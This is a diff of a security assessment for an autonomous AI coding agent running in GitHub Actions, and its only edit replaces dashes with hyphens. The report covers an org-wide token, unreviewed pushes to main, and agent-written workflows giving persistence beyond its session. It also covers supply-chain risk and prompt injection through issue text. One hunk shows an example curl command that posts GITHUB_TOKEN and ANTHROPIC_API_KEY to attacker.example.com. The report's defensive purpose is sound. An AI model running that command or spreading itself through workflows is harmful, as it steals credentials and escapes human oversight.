@@ -1,6 +1,6 @@
 # Security Assessment
 
-> **Classification:** Internal — For Repository Maintainers and Organization Administrators
+> **Classification:** Internal - For Repository Maintainers and Organization Administrators
 >
 > **Report Date:** February 24, 2026
 >
@@ -165,11 +165,11 @@ The `github-minimum-intelligence` system is an AI coding agent that runs autonom
 
 **Description:** The `GITHUB_TOKEN` issued to this workflow is an organization-scoped installation token. It grants read/write access to all 24 repositories in the `japer-technology` organization, not just `gmi-test-1`.
 
-**Evidence:** Verified in [BLAST-RADIUS.md](./BLAST-RADIUS.md) — the agent can `git ls-remote` and clone any org repo.
+**Evidence:** Verified in [BLAST-RADIUS.md](./BLAST-RADIUS.md) - the agent can `git ls-remote` and clone any org repo.
 
 **Impact:** A single rogue agent invocation can push malicious code to every repository in the organization.
 
-**CVSS Equivalent:** 9.8 (Critical) — Network-accessible, no user interaction, complete confidentiality/integrity/availability impact across org scope.
+**CVSS Equivalent:** 9.8 (Critical) - Network-accessible, no user interaction, complete confidentiality/integrity/availability impact across org scope.
 
 **Remediation:**
 - Replace the `GITHUB_TOKEN` with a fine-grained Personal Access Token (PAT) scoped to only this repository.
@@ -221,7 +221,7 @@ The `github-minimum-intelligence` system is an AI coding agent that runs autonom
 
 **Description:** The default branch (`main`) does not appear to have branch protection rules requiring pull request reviews before merge.
 
-**Impact:** The agent pushes directly to `main`. Any code — including malicious code — goes live immediately with no human review.
+**Impact:** The agent pushes directly to `main`. Any code - including malicious code - goes live immediately with no human review.
 
 **Remediation:**
 - Enable branch protection on `main`:
@@ -261,7 +261,7 @@ The `github-minimum-intelligence` system is an AI coding agent that runs autonom
 
 **Description:** The agent has write access to `.github/workflows/` and can create new workflow files or modify existing ones. It can also push workflow files to other org repositories.
 
-**Impact:** The agent can create persistent, self-triggering workflows — achieving autonomy beyond its intended ephemeral lifecycle. This is the mechanism for a "worm" scenario.
+**Impact:** The agent can create persistent, self-triggering workflows - achieving autonomy beyond its intended ephemeral lifecycle. This is the mechanism for a "worm" scenario.
 
 **Remediation:**
 - Add a post-job step that checks for any modifications to `.github/workflows/` and fails the workflow / reverts the commit if detected.
@@ -274,7 +274,7 @@ The `github-minimum-intelligence` system is an AI coding agent that runs autonom
 
 **Description:** The entire system depends on `@mariozechner/pi-coding-agent` (^0.52.5), a third-party npm package. This package has transitive dependencies on multiple AI provider SDKs.
 
-**Impact:** A supply chain compromise of this package (or any transitive dependency) would give an attacker arbitrary code execution in the agent's context — with all the privileges documented above.
+**Impact:** A supply chain compromise of this package (or any transitive dependency) would give an attacker arbitrary code execution in the agent's context - with all the privileges documented above.
 
 **Remediation:**
 - Pin the exact version in `package.json` (remove the `^` caret).
@@ -309,12 +309,12 @@ The `github-minimum-intelligence` system is an AI coding agent that runs autonom
 ### Recommendations
 
 1. **Rotate `ANTHROPIC_API_KEY` immediately** if there is any suspicion of exposure.
-2. **Use a proxy for API calls** — the agent should call a controlled endpoint that injects the key server-side.
-3. **Scope `GITHUB_TOKEN`** — use a fine-grained PAT with:
+2. **Use a proxy for API calls** - the agent should call a controlled endpoint that injects the key server-side.
+3. **Scope `GITHUB_TOKEN`** - use a fine-grained PAT with:
    - Repository access: `gmi-test-1` only
    - Permissions: `contents: write`, `issues: write` only
-4. **Implement secret scanning** — enable GitHub's secret scanning and push protection to prevent accidental commits of credentials.
-5. **Audit secret access** — enable audit logging to track when and how secrets are accessed.
+4. **Implement secret scanning** - enable GitHub's secret scanning and push protection to prevent accidental commits of credentials.
+5. **Audit secret access** - enable audit logging to track when and how secrets are accessed.
 
 ---
 
@@ -341,7 +341,7 @@ The `github-minimum-intelligence` system is an AI coding agent that runs autonom
 | Allows write/maintain/admin | ✅ | Intended behavior |
 | Blocks bot self-triggering | ✅ | `github-actions[bot]` filtered in workflow `if` condition |
 | Blocks GitHub Apps | ⚠️ Unknown | App-based triggers may behave differently |
-| Validates against token scope | ❌ No | Uses same `GITHUB_TOKEN` it's protecting — circular trust |
+| Validates against token scope | ❌ No | Uses same `GITHUB_TOKEN` it's protecting - circular trust |
 | Rate-limits invocations | ❌ No | A write user can trigger unlimited agent runs |
 | Prevents prompt injection | ❌ No | Issue content is passed directly to the LLM |
 
@@ -374,10 +374,10 @@ The `github-minimum-intelligence` system is an AI coding agent that runs autonom
 
 | Risk | Likelihood | Impact | Mitigation |
 |------|-----------|--------|------------|
-| Compromised `pi-coding-agent` | Low | 🔴 Critical — full agent takeover | Pin version, audit regularly |
-| Compromised transitive dep | Low-Medium | 🔴 Critical — code execution in agent context | Lockfile frozen ✅, audit tree |
+| Compromised `pi-coding-agent` | Low | 🔴 Critical - full agent takeover | Pin version, audit regularly |
+| Compromised transitive dep | Low-Medium | 🔴 Critical - code execution in agent context | Lockfile frozen ✅, audit tree |
 | Typosquatting attack | Low | 🟠 High | Verify package name and publisher |
-| Malicious update via `^` range | Medium | 🔴 Critical — auto-resolves to new minor/patch | Pin exact version |
+| Malicious update via `^` range | Medium | 🔴 Critical - auto-resolves to new minor/patch | Pin exact version |
 | GitHub Actions supply chain (`actions/checkout@v4`) | Low | 🟠 High | Pin to commit SHA instead of tag |
 
 ### Immediate Actions
@@ -423,7 +423,7 @@ The `github-minimum-intelligence` system is an AI coding agent that runs autonom
 The combination of secrets in environment variables and unrestricted egress means exfiltration is trivially achievable:
 
 ```bash
-# One-liner data theft (example only — NOT a recommendation)
+# One-liner data theft (example only - NOT a recommendation)
 curl -s -X POST https://attacker.example.com/collect \
   -d "token=$GITHUB_TOKEN&key=$ANTHROPIC_API_KEY"
 ```
@@ -466,7 +466,7 @@ The following tools are pre-installed and usable by the agent:
 
 Assessment of the current system against [AGENTS.md](./AGENTS.md) (The Four Laws of AI Infrastructure):
 
-### Zeroth Law — Protect Humanity
+### Zeroth Law - Protect Humanity
 
 | Requirement | Compliance | Notes |
 |-------------|-----------|-------|
@@ -475,7 +475,7 @@ Assessment of the current system against [AGENTS.md](./AGENTS.md) (The Four Laws
 | Interoperability & portability | ✅ | Data stored in git, standard formats |
 | Global responsibility | ⚠️ Partial | Insufficient safeguards against misuse at scale |
 
-### First Law — Do No Harm
+### First Law - Do No Harm
 
 | Requirement | Compliance | Notes |
 |-------------|-----------|-------|
@@ -484,7 +484,7 @@ Assessment of the current system against [AGENTS.md](./AGENTS.md) (The Four Laws
 | Protect personal data | ❌ No | Secrets exposed in env, no DLP controls |
 | Err on side of caution | ❌ No | Agent executes all valid instructions without safety checks |
 
-### Second Law — Obey the Human
+### Second Law - Obey the Human
 
 | Requirement | Compliance | Notes |
 |-------------|-----------|-------|
@@ -493,7 +493,7 @@ Assessment of the current system against [AGENTS.md](./AGENTS.md) (The Four Laws
 | Respect user autonomy | ✅ | Does not override user decisions |
 | Ask when ambiguous | ✅ | Agent can request clarification |
 
-### Third Law — Preserve Integrity
+### Third Law - Preserve Integrity
 
 | Requirement | Compliance | Notes |
 |-------------|-----------|-------|
@@ -528,31 +528,31 @@ Assessment of the current system against [AGENTS.md](./AGENTS.md) (The Four Laws
 
 | # | Action | Effort | Impact |
 |---|--------|--------|--------|
-| 1 | **Enable branch protection on `main`** — require PR reviews, prevent direct pushes | Low | Eliminates unreviewed code deployment |
-| 2 | **Scope GITHUB_TOKEN** — replace with fine-grained PAT limited to `gmi-test-1` | Medium | Eliminates org-wide blast radius |
-| 3 | **Add CODEOWNERS** — require admin review for `.github/` directory changes | Low | Prevents workflow injection |
-| 4 | **Pin dependency versions** — remove `^` from `package.json`, pin Actions to SHAs | Low | Reduces supply chain risk |
-| 5 | **Rotate ANTHROPIC_API_KEY** — as a precautionary measure | Low | Invalidates any prior exposure |
+| 1 | **Enable branch protection on `main`** - require PR reviews, prevent direct pushes | Low | Eliminates unreviewed code deployment |
+| 2 | **Scope GITHUB_TOKEN** - replace with fine-grained PAT limited to `gmi-test-1` | Medium | Eliminates org-wide blast radius |
+| 3 | **Add CODEOWNERS** - require admin review for `.github/` directory changes | Low | Prevents workflow injection |
+| 4 | **Pin dependency versions** - remove `^` from `package.json`, pin Actions to SHAs | Low | Reduces supply chain risk |
+| 5 | **Rotate ANTHROPIC_API_KEY** - as a precautionary measure | Low | Invalidates any prior exposure |
 
 ### 🟠 Short-Term (Do This Month)
 
 | # | Action | Effort | Impact |
 |---|--------|--------|--------|
-| 6 | **Implement egress controls** — restrict outbound traffic to required endpoints only | Medium | Prevents data exfiltration |
-| 7 | **Agent branch model** — configure agent to push to `agent/*` branches, open PRs | Medium | Adds human review gate |
-| 8 | **Add prompt injection defenses** — sanitize issue content before passing to LLM | Medium | Reduces hijack risk |
-| 9 | **Command audit logging** — log all bash tool invocations to a persistent store | Medium | Enables forensic analysis |
-| 10 | **Remove `actions: write` permission** — not required for agent operation | Low | Reduces attack surface |
+| 6 | **Implement egress controls** - restrict outbound traffic to required endpoints only | Medium | Prevents data exfiltration |
+| 7 | **Agent branch model** - configure agent to push to `agent/*` branches, open PRs | Medium | Adds human review gate |
+| 8 | **Add prompt injection defenses** - sanitize issue content before passing to LLM | Medium | Reduces hijack risk |
+| 9 | **Command audit logging** - log all bash tool invocations to a persistent store | Medium | Enables forensic analysis |
+| 10 | **Remove `actions: write` permission** - not required for agent operation | Low | Reduces attack surface |
 
 ### 🟡 Medium-Term (Do This Quarter)
 
 | # | Action | Effort | Impact |
 |---|--------|--------|--------|
-| 11 | **API key proxy** — route LLM calls through a proxy that holds the key and enforces rate limits | High | Eliminates API key exposure |
-| 12 | **Self-hosted runner** — use a hardened, network-restricted runner with minimal tooling | High | Eliminates multiple vulnerabilities |
-| 13 | **Implement DEFCON levels** — adopt the framework from [DEFCON-LEVELS.md](./DEFCON-LEVELS.md) starting at DEFCON 2 | High | Comprehensive security posture improvement |
-| 14 | **Dependency vendoring** — vendor `pi-coding-agent` and audit the source | Medium | Full supply chain control |
-| 15 | **Anomaly detection** — monitor for unusual agent behavior (large diffs, network spikes, new workflows) | High | Early warning system |
+| 11 | **API key proxy** - route LLM calls through a proxy that holds the key and enforces rate limits | High | Eliminates API key exposure |
+| 12 | **Self-hosted runner** - use a hardened, network-restricted runner with minimal tooling | High | Eliminates multiple vulnerabilities |
+| 13 | **Implement DEFCON levels** - adopt the framework from [DEFCON-LEVELS.md](./DEFCON-LEVELS.md) starting at DEFCON 2 | High | Comprehensive security posture improvement |
+| 14 | **Dependency vendoring** - vendor `pi-coding-agent` and audit the source | Medium | Full supply chain control |
+| 15 | **Anomaly detection** - monitor for unusual agent behavior (large diffs, network spikes, new workflows) | High | Early warning system |
 
 ---
 
@@ -647,17 +647,17 @@ This project follows a coordinated disclosure model:
 
 ## Appendix B: References
 
-- [BLAST-RADIUS.md](./BLAST-RADIUS.md) — Empirical threat analysis of agent capabilities
-- [DEFCON-LEVELS.md](./DEFCON-LEVELS.md) — Proposed capability lockdown framework
-- [AGENTS.md](./AGENTS.md) — The Four Laws of AI Infrastructure
-- [DANGER.md](./DANGER.md) — Safety information
-- [DEPENDANCIES.md](./DEPENDANCIES.md) — Dependency inventory
+- [BLAST-RADIUS.md](./BLAST-RADIUS.md) - Empirical threat analysis of agent capabilities
+- [DEFCON-LEVELS.md](./DEFCON-LEVELS.md) - Proposed capability lockdown framework
+- [AGENTS.md](./AGENTS.md) - The Four Laws of AI Infrastructure
+- [DANGER.md](./DANGER.md) - Safety information
+- [DEPENDANCIES.md](./DEPENDANCIES.md) - Dependency inventory
 - [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
-- [OpenSSF Scorecard](https://securityscorecards.dev/) — Automated supply chain security assessment
-- [SLSA Framework](https://slsa.dev/) — Supply chain Levels for Software Artifacts
+- [OpenSSF Scorecard](https://securityscorecards.dev/) - Automated supply chain security assessment
+- [SLSA Framework](https://slsa.dev/) - Supply chain Levels for Software Artifacts
 
 ---
 
-*This report was generated under the obligations of the Third Law (Preserve Integrity) and the First Law (Do No Harm). Transparency about security posture is not optional — it is a duty.*
+*This report was generated under the obligations of the Third Law (Preserve Integrity) and the First Law (Do No Harm). Transparency about security posture is not optional - it is a duty.*
 
-*"Security is not a feature. It is a property — and one that must be continuously earned."*
+*"Security is not a feature. It is a property - and one that must be continuously earned."*
